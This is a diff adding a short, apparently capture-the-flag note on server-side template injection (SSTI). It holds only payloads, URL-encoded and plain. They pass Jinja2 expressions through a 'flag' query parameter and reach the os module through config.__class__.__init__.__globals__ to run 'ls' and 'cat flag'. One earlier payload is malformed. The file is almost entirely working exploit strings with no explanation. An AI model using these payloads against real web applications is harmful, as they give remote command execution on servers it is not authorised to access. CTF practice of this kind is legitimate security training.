@@ -1,0 +1,10 @@
+SSTI模版注入：
+
+?flag={{}system(ls)}
+
+ls:
+?flag={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()}}
+{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+
+cat flag:
+/?flag={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()}}
